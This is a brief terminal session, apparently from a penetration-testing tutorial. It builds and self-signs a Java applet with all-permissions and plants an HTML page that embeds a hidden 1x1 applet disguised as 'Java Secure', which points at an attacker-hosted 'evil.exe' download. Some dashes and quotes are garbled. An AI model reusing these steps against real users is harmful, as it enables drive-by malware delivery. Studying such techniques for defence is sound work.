```
root@kali:~# javac Java.java
root@kali:~# echo “Permissions: all-­‐permissions” > /root/manifest.txt
root@kali:~# jar cvf Java.jar Java.class
    added manifest
    adding: Java.class(in = 1233) (out= 709)(deflated 42%)

root@kali:~# keytool -­‐genkey -­‐alias signapplet -­‐keystore mykeystore -­‐keypass mykeypass -­‐storepass password123

root@kali:~# jarsigner -­‐keystore mykeystore -­‐storepass password123 -­‐keypass
    mykeypass -­‐signedjar SignedJava.jar Java.jar signapplet

root@kali:~# echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://192.168.10.5:80/evil.exe"></applet>' > /var/www/java.html
```
